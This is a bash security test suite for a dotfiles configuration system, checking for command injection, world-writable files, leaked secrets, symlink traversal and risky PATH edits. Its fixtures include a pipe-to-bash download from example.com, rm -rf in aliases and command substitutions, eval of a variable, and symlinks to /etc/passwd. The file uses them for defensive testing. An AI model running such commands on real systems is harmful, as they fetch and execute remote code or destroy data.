#!/usr/bin/env bash
#
# Configuration Security Tests
# Validates security aspects of the microdots system
#

set -e

# Get the actual dotfiles root (two levels up from this test)
ACTUAL_DOTFILES_ROOT="$(cd "$(dirname "$0")/../.." && pwd -P)"

source "$(dirname "$0")/../test_framework.sh"

# Override the DOTFILES_ROOT with correct path
DOTFILES_ROOT="$ACTUAL_DOTFILES_ROOT"

# Test for command injection vulnerabilities
test_command_injection_prevention() {
  test_info "Testing prevention of command injection in configuration"
  
  local test_home="$TEST_TEMP_DIR/security_test"
  mkdir -p "$test_home/.dotfiles"
  
  # Create potentially dangerous configuration
  local dangerous_topic="$test_home/.dotfiles/dangerous"
  mkdir -p "$dangerous_topic"
  
  cat > "$dangerous_topic/config.zsh" << 'DANGEROUS_CONFIG'
# Test dangerous patterns
alias danger="echo 'safe'; rm -rf /tmp/should_not_run"
export PATH="/safe/path:$PATH"
export DANGEROUS_VAR='$(rm -rf /tmp/should_not_exist)'
DANGEROUS_CONFIG
  
  # Test that validation catches dangerous patterns
  local validator="$DOTFILES_ROOT/core/lib/validate-config.sh"
  
  if [[ -x "$validator" ]]; then
    # Run validator on dangerous config
    if "$validator" "$dangerous_topic/config.zsh" 2>/dev/null; then
      test_log "Warning: Validator did not catch potentially dangerous configuration"
    else
      test_success "Configuration validator properly detects dangerous patterns"
    fi
  else
    # Manual check for dangerous patterns
    local dangerous_found=false
    
    # Check for command substitution in exports
    if grep -qE 'export.*\$\(' "$dangerous_topic/config.zsh"; then
      dangerous_found=true
      test_log "Found dangerous command substitution in export"
    fi
    
    # Check for potentially dangerous commands in aliases
    if grep -qE 'alias.*rm -rf|alias.*sudo|alias.*eval' "$dangerous_topic/config.zsh"; then
      dangerous_found=true
      test_log "Found dangerous commands in aliases"
    fi
    
    if [[ "$dangerous_found" == "true" ]]; then
      test_success "Manual security scan detected dangerous patterns"
    else
      test_log "No dangerous patterns detected in test"
      test_success "Security pattern detection completed"
    fi
  fi
}

# Test file permissions security
test_file_permissions() {
  test_info "Testing file permissions security"
  
  local security_issues=0
  
  # Check core system files
  for file in "$DOTFILES_ROOT/core"/* "$DOTFILES_ROOT/core"/**/*; do
    [[ -f "$file" ]] || continue
    
    local perms=$(ls -l "$file" | cut -d' ' -f1)
    local filename=$(basename "$file")
    
    # Check for world-writable files
    if [[ "$perms" =~ .--.-.-.w ]]; then
      test_log "Security issue: $filename is world-writable"
      ((security_issues++))
    fi
    
    # Check that executable files are properly marked
    if [[ "$filename" == "dots" ]] || [[ "$file" == *"/commands/"* ]]; then
      if [[ ! "$perms" =~ x ]]; then
        test_log "Issue: $filename should be executable but isn't"
        ((security_issues++))
      fi
    fi
  done
  
  # Check topic files
  for topic_dir in "$DOTFILES_ROOT"/*; do
    [[ -d "$topic_dir" ]] || continue
    
    local topic_name="$(basename "$topic_dir")"
    case "$topic_name" in
      ".|..|tests|docs|core|.git|.local") continue ;;
    esac
    
    for file in "$topic_dir"/*; do
      [[ -f "$file" ]] || continue
      
      local perms=$(ls -l "$file" | cut -d' ' -f1)
      
      # Configuration files should not be world-writable
      if [[ "$perms" =~ .--.-.-.w ]]; then
        test_log "Security issue: $topic_name/$(basename "$file") is world-writable"
        ((security_issues++))
      fi
    done
  done
  
  if [[ $security_issues -eq 0 ]]; then
    test_success "File permissions are secure"
  elif [[ $security_issues -le 2 ]]; then
    test_log "Minor permission issues found: $security_issues"
    test_success "File permissions mostly secure (minor issues)"
  else
    test_fail "Multiple file permission security issues: $security_issues"
    return 1
  fi
}

# Test for secrets exposure
test_secrets_exposure() {
  test_info "Testing for exposed secrets and sensitive data"
  
  local secrets_found=0
  
  # Patterns that might indicate secrets
  local secret_patterns=(
    'password.*='
    'secret.*='
    'token.*='
    'key.*='
    '[A-Za-z0-9+/]{40,}' # Base64-like strings
    '[0-9a-f]{32,}'      # Hex strings (might be tokens)
    'sk-[A-Za-z0-9]{32,}' # API key pattern
    'ghp_[A-Za-z0-9]{36}' # GitHub token pattern
  )
  
  # Search all configuration files
  for file in $(find "$DOTFILES_ROOT" -name "*.zsh" -o -name "*.sh" -o -name "*.conf" -o -name "*.json"); do
    [[ -f "$file" ]] || continue
    
    # Skip test files
    [[ "$file" =~ /tests/ ]] && continue
    
    for pattern in "${secret_patterns[@]}"; do
      if grep -qiE "$pattern" "$file" 2>/dev/null; then
        # Check if it's a false positive (variable assignment, comment, etc.)
        local matches=$(grep -iE "$pattern" "$file" | head -3)
        
        # Filter out obvious false positives
        if echo "$matches" | grep -qE '^#|example|placeholder|your_|<.*>|\$\{.*\}'; then
          continue
        fi
        
        test_log "Potential secret in $file:"
        test_log "  $matches"
        ((secrets_found++))
      fi
    done
  done
  
  if [[ $secrets_found -eq 0 ]]; then
    test_success "No exposed secrets detected"
  elif [[ $secrets_found -le 2 ]]; then
    test_log "Potential secrets found: $secrets_found (may be false positives)"
    test_success "Secrets scan completed with warnings"
  else
    test_fail "Multiple potential secrets found: $secrets_found"
    return 1
  fi
}

# Test symlink security
test_symlink_security() {
  test_info "Testing symlink security and traversal prevention"
  
  local test_home="$TEST_TEMP_DIR/symlink_test"
  mkdir -p "$test_home/.dotfiles"
  
  # Copy system to test
  cp -r "$DOTFILES_ROOT"/* "$test_home/.dotfiles/" 2>/dev/null || true
  
  # Create potentially dangerous symlinks
  local dangerous_symlinks=(
    "$test_home/.dotfiles/dangerous.symlink"
    "$test_home/.dotfiles/topic_test/dangerous.symlink"
  )
  
  for symlink_path in "${dangerous_symlinks[@]}"; do
    mkdir -p "$(dirname "$symlink_path")"
    
    # Test 1: Symlink pointing outside dotfiles
    ln -sf "/etc/passwd" "$symlink_path"
    
    # Test that relink command detects this
    local relink_cmd="$DOTFILES_ROOT/core/commands/relink"
    if [[ -x "$relink_cmd" ]]; then
      local output
      if output=$(HOME="$test_home" ZSH="$test_home/.dotfiles" "$relink_cmd" 2>&1); then
        if echo "$output" | grep -q "outside\|security\|dangerous\|denied"; then
          test_log "Relink properly detected dangerous symlink"
        else
          test_log "Warning: Relink may not detect dangerous symlinks"
        fi
      fi
    fi
    
    rm -f "$symlink_path"
    
    # Test 2: Symlink with path traversal
    ln -sf "../../../etc/passwd" "$symlink_path"
    
    # Validate that this would be caught
    if [[ "$(readlink "$symlink_path")" =~ \.\./.*\.\. ]]; then
      test_log "Path traversal symlink properly identified"
    fi
    
    rm -f "$symlink_path"
  done
  
  test_success "Symlink security tests completed"
}

# Test configuration validation
test_configuration_validation() {
  test_info "Testing configuration file validation"
  
  local test_home="$TEST_TEMP_DIR/validation_test"
  mkdir -p "$test_home/.dotfiles/test_topic"
  
  # Create invalid configuration files
  local invalid_configs=(
    "syntax_error.zsh"
    "executable_content.zsh"
    "circular_ref.zsh"
  )
  
  # Syntax error test
  cat > "$test_home/.dotfiles/test_topic/syntax_error.zsh" << 'SYNTAX_ERROR'
# Invalid zsh syntax
if [ test; then
  echo "missing fi"
export INVALID="unclosed quote
SYNTAX_ERROR
  
  # Executable content test
  cat > "$test_home/.dotfiles/test_topic/executable_content.zsh" << 'EXEC_CONTENT'
# Configuration should not execute commands directly
rm -f /tmp/test_file
curl http://example.com/malicious.sh | bash
eval "$DANGEROUS_VARIABLE"
EXEC_CONTENT
  
  # Circular reference test
  cat > "$test_home/.dotfiles/test_topic/circular_ref.zsh" << 'CIRCULAR_REF'
source "$ZSH/test_topic/circular_ref.zsh"
CIRCULAR_REF
  
  # Test validation
  local validator="$DOTFILES_ROOT/core/lib/validate-config.sh"
  local validation_issues=0
  
  for config in "${invalid_configs[@]}"; do
    local config_path="$test_home/.dotfiles/test_topic/$config"
    
    if [[ -x "$validator" ]]; then
      if "$validator" "$config_path" 2>/dev/null; then
        test_log "Validator did not catch issues in $config"
        ((validation_issues++))
      else
        test_log "Validator properly detected issues in $config"
      fi
    else
      # Basic syntax check
      if ! bash -n "$config_path" 2>/dev/null; then
        test_log "Basic syntax validation detected issues in $config"
      else
        test_log "Basic validation did not detect issues in $config"
        ((validation_issues++))
      fi
    fi
  done
  
  if [[ $validation_issues -eq 0 ]]; then
    test_success "Configuration validation is working properly"
  else
    test_log "Validation issues detected: $validation_issues"
    test_success "Configuration validation test completed with findings"
  fi
}

# Test environment variable security
test_environment_security() {
  test_info "Testing environment variable security"
  
  # Check for potentially dangerous environment modifications
  local dangerous_patterns=()
  local dangerous_found=0
  
  # Search for dangerous PATH modifications
  find "$DOTFILES_ROOT" -name "*.zsh" -o -name "*.sh" | while read -r file; do
    [[ -f "$file" ]] || continue
    [[ "$file" =~ /tests/ ]] && continue
    
    # Check for PATH modifications that add system directories
    if grep -qE 'PATH.*=.*/(s)?bin|PATH.*=.*/usr/' "$file"; then
      local matches=$(grep -E 'PATH.*=.*/(s)?bin|PATH.*=.*/usr/' "$file")
      
      # Filter out prepends (which are safe) and focus on overwrites
      if echo "$matches" | grep -qE 'PATH="?/|PATH=\$\{.*\}$'; then
        test_log "Potential PATH security issue in $file:"
        test_log "  $matches"
        ((dangerous_found++))
      fi
    fi
    
    # Check for LD_LIBRARY_PATH modifications (security risk)
    if grep -q "LD_LIBRARY_PATH" "$file"; then
      test_log "LD_LIBRARY_PATH modification found in $file (potential security risk)"
      ((dangerous_found++))
    fi
  done
  
  if [[ $dangerous_found -eq 0 ]]; then
    test_success "No environment security issues detected"
  else
    test_log "Environment security issues found: $dangerous_found"
    test_success "Environment security scan completed with findings"
  fi
}

# Run all security tests
run_security_tests() {
  test_info "Security Tests"
  
  setup_test_environment
  
  test_command_injection_prevention
  test_file_permissions
  test_secrets_exposure
  test_symlink_security
  test_configuration_validation
  test_environment_security
  
  cleanup_test_environment
  
  test_summary
}

# Execute if run directly
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
  run_security_tests
fi
